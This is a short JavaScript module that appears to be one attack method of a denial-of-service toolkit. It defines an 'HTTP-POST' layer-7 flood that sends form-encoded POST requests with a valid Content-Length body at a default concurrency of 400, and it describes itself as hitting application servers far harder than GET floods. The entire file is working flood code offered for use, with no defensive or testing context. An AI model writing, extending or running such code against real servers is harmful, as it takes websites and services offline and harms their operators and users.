'use strict';
const { createHttpMethod } = require('./_http');

module.exports = {
  name: 'HTTP-POST',
  layer: 7,
  summary: 'POST flood with a correct Content-Length body. Hits app servers far harder than GET.',
  defaults: { concurrency: 400 },
  create(ctx) {
    const body = Buffer.from(ctx.opts.payload || 'v=1&t=venice');
    return createHttpMethod(ctx, () => ({
      method: 'POST',
      path: ctx.target.path,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': String(body.length),
      },
      body,
    }));
  },
};
